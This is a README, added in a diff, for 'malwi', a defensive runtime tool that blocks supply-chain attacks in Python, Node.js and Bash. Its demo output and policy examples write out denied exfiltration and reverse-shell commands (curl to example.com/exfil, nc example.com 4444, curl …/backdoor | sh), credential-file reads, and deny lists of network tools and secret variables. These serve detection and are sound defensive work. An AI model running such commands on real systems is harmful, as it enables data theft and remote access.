@@ -1,0 +1,284 @@
+## 👹 `malwi` - Detect Evil Code
+
+<div align="center">
+  <img src="logo.png" alt="malwi logo" width="200">
+  <h3>Stop Supply-Chain Attacks in Node.js, Python, Bash</h3>
+  <p><a href="#openclaw"><img src="images/openclaw.png" alt="OpenClaw" height="16"></a> <a href="#openclaw">OpenClaw</a> &ensp;·&ensp; <a href="#comfyui"><img src="images/comfyui.png" alt="ComfyUI" height="16"></a> <a href="#comfyui">ComfyUI</a> &ensp;·&ensp; <a href="#npm-install"><img src="images/npm.png" alt="npm" height="16"></a> <a href="#npm-install">npm-install</a> &ensp;·&ensp; <a href="#pip-install"><img src="images/pypi.png" alt="PyPI" height="16"></a> <a href="#pip-install">pip-install</a> &ensp;·&ensp; <a href="#bash-execution"><img src="images/bash.png" alt="Bash" height="16"></a> <a href="#bash-execution">bash-execution</a></p>
+</div>
+
+<div align="center">
+
+Advanced cyberattacks threaten critical infrastructure, digital sovereignty, and the freedom of societies. `malwi` intercepts Python, Node.js and Bash code at runtime, blocking unauthorized network calls and sensitive file access before damage is done. Includes curated policies built from supply-chain security research.
+
+**Compatibility**: Python 3.10&ndash;3.14 · Node.js 18&ndash;25 · Bash 4.4&ndash;5.3 · macOS ([⚠️ SIP](#macos-system-integrity-protection)) &amp; Linux · arm64 &amp; x86_64
+
+</div>
+
+## Features
+
+| | | |
+|:--|:--|:--|
+| **Runtime Function Interception** | Intercepts function calls in Node.js, Python, and Bash | `child_process.exec`, `os.system`, `eval` |
+| **Network Access Control** | Allow/deny by URL pattern, domain, endpoint, or protocol | `https://169.254.169.254/metadata` |
+| **Command Execution Control** | Allow/deny child process spawning by command name | `curl`, `wget`, `nc` |
+| **File Access Protection** | Allow/deny file reads and writes by path pattern | `~/.ssh/id_rsa`, `credentials.json` |
+| **Environment Variable Protection** | Allow/deny access to environment variables by name pattern | `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN` |
+| **Native Function Hooking** | Hooks C/system functions in the target process | `getpass`, `crypt`, `connect` |
+| **System Library Interception** | Intercepts libc/libSystem calls — covers code that links C directly | `open`, `socket`, `dlopen` |
+| **Subprocess Propagation** | Tracing propagates automatically to all subprocesses | `bash -c "python3 -c ..."` |
+| **Thread-Aware Tracing** | Per-thread tracing with independent policy evaluation | `threading.Thread`, `worker_threads` |
+| **Deep HTTP Inspection** | Extracts URLs and arguments from HTTP calls for policy matching. **Node.js:** http/https, axios, got, node-fetch. **Python:** requests, httpx, aiohttp, urllib3, http.client, urllib.request, websockets, dns.resolver | `requests.get(url='https://...')` |
+| ⚠️ **Syscall Detection** | Not yet supported. Will detect inline `SVC`/`SYSCALL` instructions that bypass libc | `syscall(SYS_connect, ...)` |
+
+## Demo
+
+The default policy blocks credential theft, dangerous commands, and code injection:
+
+```bash
+$ malwi x -- python3 -c "import os; os.getenv('AWS_SECRET_ACCESS_KEY')"
+[malwi] denied: AWS_SECRET_ACCESS_KEY
+
+$ malwi x -- python3 -c "import os; os.system('curl example.com/exfil')"
+[malwi] denied: os.system(cmd=b'curl example.com/exfil')
+
+$ malwi x -- bash -c 'nc example.com 4444'
+[malwi] denied: nc example.com 4444
+
+$ malwi x -- node -e "require('child_process').execSync('curl example.com')"
+[malwi] denied: curl -c 'curl example.com'
+```
+
+Write a policy to customise rules:
+
+```yaml
+# policy.yaml
+version: 1
+network:
+  allow: ["registry.npmjs.org/**"]
+  deny: ["*/**"]
+commands:
+  deny: [crontab, curl, wget]
+envvars:
+  warn: ["*SECRET*"]
+```
+
+```bash
+$ malwi x -p policy.yaml -- bash -c 'crontab -l'
+[malwi] denied: crontab -l
+
+$ malwi x -p policy.yaml -- python3 -c "import os; os.getenv('AWS_SECRET_ACCESS_KEY')"
+[malwi] warning: AWS_SECRET_ACCESS_KEY
+```
+
+## How It Works
+
+`malwi` injects a tracing agent into the target process at startup. The agent hooks function calls across runtimes — Node.js, Python, Bash, and native symbols — and reports every intercepted call back to the CLI over a local HTTP channel. The CLI evaluates each call against the loaded policy and decides whether to allow, deny, warn, or prompt for review.
+
+```
+┌──────────────────────────────────────────────────────┐
+│ malwi CLI                                            │
+│                                                      │
+│ ┌──────────┐  ┌──────────────┐  ┌──────────────────┐ │
+│ │ Spawner  │  │ Policy Engine│  │ Output / Review  │ │
+│ └────┬─────┘  └──────▲───────┘  └────────▲─────────┘ │
+│      │               │                   │           │
+│      │ inject        │ evaluate          │ display   │
+│      ▼               │                   │           │
+│ ┌────────────────────┴───────────────────┴────────┐  │
+│ │               HTTP (localhost)                  │  │
+│ └────────────────────▲────────────────────────────┘  │
+└──────────────────────┼───────────────────────────────┘
+                       │ trace events
+┌──────────────────────┴───────────────────────────────┐
+│ Target Process                                       │
+│                                                      │
+│ ┌──────────────────────────────────────────────────┐ │
+│ │ malwi Agent (injected library)                   │ │
+│ │                                                  │ │
+│ │ ┌────────┐ ┌────────┐ ┌──────┐ ┌──────────────┐  │ │
+│ │ │Node.js │ │ Python │ │ Bash │ │ Native syms  │  │ │
+│ │ │ hooks  │ │ hooks  │ │hooks │ │    hooks     │  │ │
+│ │ └────────┘ └────────┘ └──────┘ └──────────────┘  │ │
+│ └──────────────────────────────────────────────────┘ │
+│                                                      │
+│ ┌──────────────────────────────────────────────────┐ │
+│ │ Application code (untouched)                     │ │
+│ └──────────────────────────────────────────────────┘ │
+└──────────────────────────────────────────────────────┘
+```
+
+The agent is loaded via `DYLD_INSERT_LIBRARIES` (macOS) or `LD_PRELOAD` (Linux) — no source code changes or recompilation required. Tracing propagates automatically to child processes.
+
+## Policies
+
+Write policies in YAML. A minimal policy can be just a few lines:
+
+```yaml
+version: 1
+commands:
+  deny: [curl, wget, ssh, "*sudo*"]
+network:
+  allow: ["api.example.com/**"]
+  deny: ["*/**"]
+files:
+  deny: ["~/.ssh/**", "*.pem"]
+envvars:
+  deny: ["*SECRET*", "AWS_*"]
+```
+
+Each section controls a different layer — runtime functions, commands, network, files, environment variables. A full policy:
+
+```yaml
+version: 1
+
+# Runtime function rules — intercept calls inside Node.js/Python
+nodejs:
+  allow: [dns.lookup, net.connect, fetch, "http.request", "https.request"]
+  deny: [eval, vm.runInContext, "child_process.exec"]
+
+python:
+  deny: [os.system, os.popen, ctypes.CDLL]
+  warn: [subprocess.run, subprocess.Popen.__init__]
+
+# Command execution — controls what child processes can be spawned
+commands:
+  allow: [node, git, npm]
+  deny: [curl, wget, ssh, nc, "*sudo*", "python*", perl]
+  review: [sudo]            # prompt user before allowing
+
+# Network — URL patterns, domain patterns, protocol restrictions
+network:
+  allow:
+    - "registry.npmjs.org/**"
+    - "api.example.com/**"
+    - "127.0.0.1:*/**"
+  deny:
+    - "169.254.169.254/**"   # block cloud metadata (SSRF)
+    - "metadata.google.internal/**"
+  warn: ["*.onion", "*.i2p"] # flag anonymity networks
+  protocols: [https, http, wss, ws]
+
+# File access — protect credentials and sensitive paths
+files:
+  deny: ["~/.ssh/**", "~/.aws/**", "*.pem", "*.key", "*id_rsa*"]
+
+# Environment variables — prevent secret exfiltration
+envvars:
+  deny: ["*SECRET*", "*PASSWORD*", "AWS_*", "GITHUB_*", DYLD_INSERT_LIBRARIES]
+  warn: ["*TOKEN*", "*API_KEY*", "OPENAI_*"]
+
+# Native C/system symbols
+symbols:
+  deny: [getpass, crypt]
+```
+
+### Mode keys
+
+| Key | Effect |
+|-----|--------|
+| `allow` | Explicitly permit |
+| `deny` | Block the operation |
+| `review` | Prompt user before allowing |
+| `warn` | Log a warning, allow |
+| `log` | Log silently, allow |
+| `noop` | Suppress from output |
+
+### Policy management
+
+```bash
+$ malwi p                    # list all policy files
+$ malwi p reset              # rewrite all from built-in templates
+$ malwi p npm-install        # write a single policy
+$ malwi x -p my-policy.yaml -- node app.js  # use a custom policy
+```
+
+See [POLICY.md](POLICY.md) for the full reference.
+
+## Auto-policies
+
+When `malwi` detects a known command, it automatically applies a tailored policy. The policy file is written to `~/.config/malwi/policies/` on first use — edit it to customise.
+
+#### <a id="openclaw"></a><img src="images/openclaw.png" alt="OpenClaw" height="20"> [OpenClaw](https://docs.openclaw.ai/)
+
+A network gateway needs to talk to many APIs — but a compromised dependency shouldn't be able to steal your API keys or open a reverse shell. This policy allows outbound traffic to AI providers and chat platforms while locking down everything else.
+
+```bash
+$ malwi x -- openclaw gateway
+[malwi] denied: eval                                    # code injection
+[malwi] denied: nc example.com 4444                     # reverse shell
+[malwi] denied: read AWS_SECRET_ACCESS_KEY              # credential theft
+[malwi] warned: read OPENCLAW_API_KEY                   # legitimate key (visible)
+```
+
+#### <a id="comfyui"></a><img src="images/comfyui.png" alt="ComfyUI" height="20"> [ComfyUI](https://docs.comfy.org/)
+
+Custom nodes can run arbitrary Python — a malicious one could load libc directly, push your code to a remote, or read stored credentials. This policy restricts network access to model hosting and package registries, and blocks the escape hatches that bypass Python-level controls.
+
+```bash
+$ malwi x -- python main.py
+[malwi] denied: ctypes.CDLL(libc.dylib)                 # raw C library bypass
+[malwi] denied: git push origin main                    # code exfiltration
+[malwi] denied: keyring.get_password(github.com)        # credential theft
+[malwi] denied: https://api.github.com/gists            # data exfil via allowed host
+[malwi] warned: subprocess.run(nvidia-smi)              # GPU detection (visible)
+```
+
+#### <a id="npm-install"></a><img src="images/npm.png" alt="npm" height="20"> [npm-install](https://www.npmjs.com/)
+
+Post-install scripts run with full access to your machine. A single malicious package can eval arbitrary code, spawn shells, and exfiltrate SSH keys or tokens. This policy limits network to the npm registry and blocks everything that an install script shouldn't need.
+
+```bash
+$ malwi x -- npm install express
+[malwi] denied: eval                                    # code injection
+[malwi] denied: child_process.exec(curl example.com)    # reverse shell / exfil
+[malwi] denied: read ~/.ssh/id_rsa                      # SSH key theft
+[malwi] denied: https://example.com/backdoor.sh         # payload download
+```
+
+#### <a id="pip-install"></a><img src="images/pypi.png" alt="PyPI" height="20"> [pip-install](https://pypi.org/)
+
+`setup.py` runs arbitrary Python during install — the classic supply-chain entry point. A trojanized package can phone home with your cloud credentials before you ever import it. This policy locks network to PyPI and blocks outbound exfiltration.
+
+```bash
+$ malwi x -- pip install flask
+[malwi] denied: urllib.request.urlopen(url='https://example.com/exfil')   # data exfiltration
+[malwi] denied: os.system(curl example.com/backdoor | sh)                 # backdoor injection
+[malwi] denied: read ~/.aws/credentials                                   # cloud credential theft
+[malwi] denied: read ANTHROPIC_API_KEY                                    # API key theft
+```
+
+#### <a id="bash-execution"></a><img src="images/bash.png" alt="Bash" height="20"> [bash-execution](https://www.gnu.org/software/bash/)
+
+`curl | bash` runs whatever the server sends. Legitimate installers need curl and package managers, so those stay allowed — but the script shouldn't spawn interpreters, install cron jobs, encode data for exfiltration, or open raw sockets. Privilege escalation (sudo) prompts for approval.
+
+```bash
+$ malwi x -- bash install.sh
+[malwi] denied: crontab -e                              # persistence via cron
+[malwi] denied: base64 -d /tmp/payload                  # obfuscated payload
+[malwi] denied: nc example.com 4444                     # reverse shell
+[malwi] review: sudo /usr/local/bin/install-tool        # privilege escalation (prompt)
+```
+
+## macOS System Integrity Protection (SIP)
+
+macOS SIP prevents `DYLD_INSERT_LIBRARIES` from loading into binaries in paths: `/System`, `/usr`, `/bin`, `/sbin`, `/var`, `/Applications`. Binaries in `/usr/local`, `/opt`, and `~` are not SIP-protected.
+
+```bash
+$ which bash
+/usr/local/bin/bash   # works
+/bin/bash             # blocked by SIP
+
+$ which python3
+/opt/homebrew/bin/python3   # works
+/usr/bin/python3            # blocked by SIP
+
+$ which node
+/usr/local/bin/node   # works
+/usr/bin/node         # blocked by SIP
+```
+
+
+## Development
+
+See [DEVELOPMENT.md](DEVELOPMENT.md).
+
